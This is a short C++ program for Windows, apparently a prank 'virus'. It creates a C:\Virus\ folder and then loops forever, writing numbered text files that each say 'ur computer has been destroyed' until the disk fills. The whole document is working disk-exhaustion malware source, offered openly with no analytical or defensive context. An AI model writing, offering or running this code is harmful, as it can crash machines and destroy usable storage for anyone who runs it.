#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
using namespace std;
int main()
{
    size_t i = 0;                                                            
    const char *path = "C:\\Virus\\";                                                     
    string content = "ur computer has been destroyed";                 
    _mkdir(path);                                                                         
    while (true)                                                                           
    {
        i++;                                                                              
        ofstream fin;                                                                
        fin.open(path + to_string(i) + ".txt", ios_base::out);                
        fin<< content;                                                                   
        fin.close();                                                                                          
    }
    return -1;
}